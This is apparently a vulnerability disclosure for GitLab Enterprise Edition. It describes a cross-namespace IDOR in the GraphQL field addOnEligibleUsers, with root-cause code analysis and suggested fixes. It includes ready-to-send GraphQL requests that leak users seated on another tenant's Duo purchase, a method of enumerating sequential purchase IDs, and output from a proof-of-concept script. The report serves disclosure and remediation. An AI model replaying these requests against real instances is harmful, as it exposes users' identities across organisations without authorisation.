### Summary

The GraphQL field `Group.addOnEligibleUsers` (EE-only, used for GitLab Duo / Code Suggestions seat management) is vulnerable to an IDOR / Broken Object-Level Authorization (CWE-639). The resolver authorizes **only** the namespace passed in `fullPath`, but the `addOnPurchaseIds` argument is attacker-controlled and is **never checked to belong to that namespace**. When `filterByAssignedSeat: "true"` is supplied, the backing finder returns the set of users assigned to the supplied purchase **without applying the namespace scope at all**.

As a result, any user who is allowed to read add-on purchases on **a single root namespace they control** (e.g. their own top-level group with a Duo add-on) can supply the `AddOnPurchase` Global ID of **any other namespace** and receive the list of users (id, username, full name) holding a seat on that foreign purchase across tenant/namespace boundaries, without any permission on the foreign namespace.

Because `AddOnPurchase` IDs are sequential integers (`gid://gitlab/GitlabSubscriptions::AddOnPurchase/1`, `/2`, `/3`, …), this also acts as an enumeration oracle to dump seat assignments instance-wide.

### Steps to reproduce

### Steps to reproduce

**Preconditions**

1. An attacker account that is **Owner** of one root group `A` (any user can create a top-level group, and the Owner has `read_add_on_purchase` on it).
2. Group `A` has any Duo / Code Suggestions add-on purchase (only required so the attacker passes the namespace-level `authorize!`; the leak does not use it).
3. A separate root group `B` that the attacker has **no** access to, with at least one user assigned a Code Suggestions seat on `B`'s purchase. This is the victim data owned by a different tenant.

In the reproduction environment the following objects were created:

| Object | Value |
|---|---|
| Attacker | `tfatt1780580610ylvd`, Owner of group `A` |
| Group A (authorized) | `tf-poc-a-1780580610ylvd` (`gid://gitlab/Group/7`) |
| Group A purchase | `gid://gitlab/GitlabSubscriptions::AddOnPurchase/1` |
| Group B (no access) | `tf-poc-b-1780580610ylvd` |
| Group B purchase (foreign) | `gid://gitlab/GitlabSubscriptions::AddOnPurchase/2` |
| Victim (B-only) | `tfvic1780580610ylvd` (`gid://gitlab/User/4`), Developer in B, assigned to B's purchase |

**Request 1: control: attacker cannot read group B directly**

```http
POST /api/graphql HTTP/1.1
Host: <target>
Content-Type: application/json
X-CSRF-Token: <attacker csrf>
Cookie: _gitlab_session=<attacker session>

{"query":"query { group(fullPath: \"tf-poc-b-1780580610ylvd\") { id fullPath } }"}
```

Response:

```json
{"data":{"group":null}}
```

**Request 2: control: same-namespace query with group A's OWN purchase returns nothing (A has no assigned seats)**

```http
POST /api/graphql HTTP/1.1
Content-Type: application/json
X-CSRF-Token: <attacker csrf>
Cookie: _gitlab_session=<attacker session>

{"query":"query { group(fullPath: \"tf-poc-a-1780580610ylvd\") { addOnEligibleUsers(addOnType: CODE_SUGGESTIONS, addOnPurchaseIds: [\"gid://gitlab/GitlabSubscriptions::AddOnPurchase/1\"], filterByAssignedSeat: \"true\") { nodes { id username name } } } }"}
```

Response:

```json
{"data":{"group":{"addOnEligibleUsers":{"nodes":[]}}}}
```

**Request 3: exploit: query authorized group A, but pass group B's FOREIGN purchase id**

```http
POST /api/graphql HTTP/1.1
Content-Type: application/json
X-CSRF-Token: <attacker csrf>
Cookie: _gitlab_session=<attacker session>

{"query":"query { group(fullPath: \"tf-poc-a-1780580610ylvd\") { id fullPath addOnEligibleUsers(addOnType: CODE_SUGGESTIONS, addOnPurchaseIds: [\"gid://gitlab/GitlabSubscriptions::AddOnPurchase/2\"], filterByAssignedSeat: \"true\") { nodes { id username name } } } }"}
```

Response (the victim from group B is leaked):

```json
{
  "data": {
    "group": {
      "id": "gid://gitlab/Group/7",
      "fullPath": "tf-poc-a-1780580610ylvd",
      "addOnEligibleUsers": {
        "nodes": [
          { "id": "gid://gitlab/User/4", "username": "tfvic1780580610ylvd", "name": "TF PoC Victim" }
        ]
      }
    }
  }
}
```

The attacker, who cannot read group `B` at all (Request 1 → `null`), receives a user that exists **only** in group `B`'s purchase. To enumerate other tenants, the attacker simply increments the `AddOnPurchase` GID (`/3`, `/4`, …).

A self-contained attacker-only PoC (login → leak, no setup) is attached as `exploit.py`. A full setup-and-verify PoC is attached as `poc.py`.

### What is the current *bug* behavior?

`Group.addOnEligibleUsers(addOnPurchaseIds: [<foreign GID>], filterByAssignedSeat: "true")` returns the users assigned to the **foreign** purchase, even though the caller has no permission on the namespace that owns that purchase. Authorization is enforced on the `fullPath` namespace only; the purchase argument bypasses authorization entirely.

#### Root-cause code analysis

**Resolver: `ee/app/graphql/resolvers/gitlab_subscriptions/add_on_eligible_users_resolver.rb`**

```ruby
def resolve(add_on_type:, add_on_purchase_ids:, search: nil, sort: nil, filter_by_assigned_seat: nil)
  authorize!(namespace)                       # (1) authorizes ONLY the fullPath namespace

  users = ::GitlabSubscriptions::AddOnEligibleUsersFinder.new(
    namespace,
    add_on_type: add_on_type,
    filter_options: {
      search_term: search,
      filter_by_assigned_seat: Gitlab::Utils.to_boolean(filter_by_assigned_seat)
    },
    sort: sort,
    add_on_purchase_id: add_on_purchase_ids.first   # (2) attacker-controlled, passed through verbatim
  ).execute

  offset_pagination(users)
end

private

def authorize!(namespace)
  raise_resource_not_available_error! unless Ability.allowed?(current_user, :read_add_on_purchase, namespace)
  return if namespace.root?
  raise_resource_not_available_error!("Add on eligible users can only be queried on a root namespace")
end
```

- `(1)` `authorize!` only checks `read_add_on_purchase` against `namespace` (the `fullPath` group) and that it is a root namespace.
- `(2)` `add_on_purchase_ids.first` comes straight from the client and is passed to the finder **without verifying that the purchase belongs to `namespace`**. This is the missing object-level authorization check.

**Finder: `ee/app/finders/gitlab_subscriptions/add_on_eligible_users_finder.rb`**

```ruby
def execute
  return User.none unless GitlabSubscriptions::AddOn::DUO_ADD_ONS.include?(add_on_type) && group.root?

  members = Member
              .with(group_namespaces_cte.to_arel)
              .with(base_ancestors_cte.to_arel)
              .with(namespace_ban_cte.to_arel)
              .from_union(member_relations)

  users = User
            .id_in(members.select(:user_id))         # (3) correctly scoped to group A's members
            .allow_cross_joins_across_databases(...)

  users = filter_assigned_users(users) if valid_filter_criteria?   # (4)

  filter_options[:search_term] ? users.search(filter_options[:search_term]) : users.sort_by_attribute(sort)
end

def valid_filter_criteria?
  return false unless add_on_purchase_id.present?
  [true, false].include? filter_options[:filter_by_assigned_seat]
end

def filter_assigned_users(collection)
  assignments = GitlabSubscriptions::UserAddOnAssignment.for_active_add_on_purchase_ids(add_on_purchase_id)  # (5) NO group/namespace constraint

  if filter_options[:filter_by_assigned_seat]
    User.id_in(assignments.select(:user_id))         # (6) BUG: ignores `collection` entirely
  else
    collection.id_not_in(assignments.select(:user_id))   # safe: stays scoped to `collection`
  end
end
```

- `(3)` `users` is correctly scoped to members of group `A` and its descendants.
- `(4)` when a purchase id + `filter_by_assigned_seat` are supplied, `filter_assigned_users` runs.
- `(5)` `for_active_add_on_purchase_ids(add_on_purchase_id)` queries `UserAddOnAssignment` by purchase id only. there is **no constraint tying the purchase to `group`/`namespace`**.
- `(6)` the critical line: in the `filter_by_assigned_seat == true` branch the method **discards the namespace-scoped `collection`** and returns `User.id_in(assignments.select(:user_id))`, i.e. *everyone assigned to the supplied purchase*, regardless of which namespace owns it. This is the cross-namespace leak.

Note the asymmetry: the `false` branch (`collection.id_not_in(...)`) is **safe**, because it keeps the namespace-scoped `collection` as its base set and only subtracts assignees. Only the `true` branch leaks. A reviewer glancing at the `false` branch may incorrectly conclude the code is scoped the vulnerability is specific to `filterByAssignedSeat: "true"`.

Additional reach: `execute` only validates that the *requested* `add_on_type` is a Duo add-on (line `return User.none unless DUO_ADD_ONS.include?(add_on_type) ...`). It never validates that the *supplied purchase* is of that type or active for the authorized group, so any `AddOnPurchase` GID can be probed by wrapping it in a Duo `addOnType`.

**Data flow:** `add_on_eligible_users_resolver.rb:53` (`add_on_purchase_id: add_on_purchase_ids.first`) → `add_on_eligible_users_finder.rb:132` (`for_active_add_on_purchase_ids(add_on_purchase_id)`) → `:135` (`User.id_in(assignments.select(:user_id))`).

---

### What is the expected *correct* behavior?

The supplied `addOnPurchaseIds` must be authorized against, or scoped to, the namespace being queried. Either:

1. In the resolver, reject any `add_on_purchase_id` whose `AddOnPurchase.namespace_id` is not the authorized root namespace (or a descendant), **or**
2. In `AddOnEligibleUsersFinder#filter_assigned_users`, keep the result intersected with the namespace-scoped `collection` in the `true` branch as well, e.g. `collection.id_in(assignments.select(:user_id))` instead of `User.id_in(assignments.select(:user_id))`, and constrain `for_active_add_on_purchase_ids` to purchases owned by `group`.

With either fix, Request 3 above must return `{"nodes":[]}` (the foreign purchase contributes no users in the attacker's namespace scope), matching the behavior of Request 2.


### Relevant logs and/or screenshots

`exploit.py` output against the live instance:

```
[*] logged in as attacker tfatt1780580610ylvd
[*] direct read of group B (tf-poc-b-1780580610ylvd): None
[*] addOnEligibleUsers via foreign purchase gid://gitlab/GitlabSubscriptions::AddOnPurchase/2:
    LEAKED -> gid://gitlab/User/4  tfvic1780580610ylvd  (TF PoC Victim)
[+] CONFIRMED: 1 user(s) from another namespace leaked
```

#### Results of GitLab environment info

```
GitLab version: 19.0.1-ee (revision 52e5d1bf910), Enterprise Edition
KAS: 19.0.1
```

## Impact

An authenticated user with no privileges on a target namespace can:

- Disclose the **identity (id, username, full name) of users assigned to a Duo / Code Suggestions seat on any other namespace** a cross-tenant PII / membership leak.
- Use the sequential `AddOnPurchase` GID space as an **enumeration oracle** to map seat assignments across the entire instance (on GitLab.com: across unrelated paying customers).
- Confirm the existence of, and membership in, purchases the attacker has no authorization to view.

The only precondition is control of a single root namespace with a Duo add-on (self-service), so the barrier to exploitation is low.
